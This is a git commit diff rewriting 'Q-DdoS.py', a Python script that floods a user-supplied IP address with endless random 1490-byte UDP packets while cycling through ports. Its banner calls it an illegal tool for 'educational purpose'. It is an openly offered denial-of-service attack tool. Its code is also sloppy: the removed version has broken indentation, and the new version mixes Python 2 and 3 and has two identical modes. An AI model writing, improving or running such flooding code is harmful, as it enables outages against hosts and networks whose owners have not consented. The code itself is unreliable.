0d05c5b8e765714f7bab2c5a2fab1c32654e4b2b
noa123456789 <105967219+noa123456789@users.noreply.github.com>
2024-02-24 20:46:36 +0100

    Update Q-DdoS.py

--- Q-DdoS.py
+++ Q-DdoS.py
@@ -1,78 +1,50 @@
-print ("\033[91m")
-import sys
 import os
-import time
 import socket
 import random
-#Code Time
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
 
-##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-#############
+def main():
+    try:
+        os.system("clear")
+        print("\033[91m")
+        os.system("figlet Q-DdoS")
+        print("Coded By : noa")
+        print("Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We'll Be Not Responsible For Kind Of Problems")
 
-os.system("clear")
-os.system("figlet Q-DdoS")
-print
-print "Coded By : nnoa"
-print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We'll Be Not Responsible For Kind Of Problems"
-print
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
-mode = input("mode 1 or 2")
-os.system("clear")
-print("\033[93m")
-os.system("figlet DdoS Attack")
-print("Team : nnoa")
-print ("\033[92m")
-sent = 0
-if mode == "1":
-while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-     if port == 65534:
-       port = 1
-  else:
-         sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-     if port == 65534:
-       port = 1
+        ip = raw_input("IP Target : ")  # Hier kun je het specifieke IP-adres invoeren
+        port = raw_input("Port       : ")
+        mode = raw_input("1 or 2: ")
+        
+        os.system("clear")
+        print("\033[93m")
+        os.system("figlet DdoS Attack")
+        print("Team : nnoa")
+        print("\033[92m")
 
-            sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-     if port == 65534:
-       port = 1
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        bytes = random._urandom(1490)
 
-            sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-     if port == 65534:
-       port = 1
+        if mode == "1":
+            sent = 0
+            while True:
+                sock.sendto(bytes, (ip,port))
+                sent = sent + 1
+                port = port + 1
+                print("Sent %s packet to %s through port:%s"%(sent,ip,port))
+                if port == 65534:
+                    port = 1
+        elif mode == "2":
+            sent = 0
+            while True:
+                sock.sendto(bytes, (ip,port))
+                sent = sent + 1
+                port = port + 1
+                print("Sent %s packet to %s through port:%s"%(sent,ip,port))
+                if port == 65534:
+                    port = 1
+        else:
+            print("Invalid mode.")
+    except Exception as e:
+        print("Error in main function:", e)
 
-            sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-     if port == 65534:
-       port = 1
-
-            sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-     if port == 65534:
-       port = 1
+if __name__ == "__main__":
+    main()
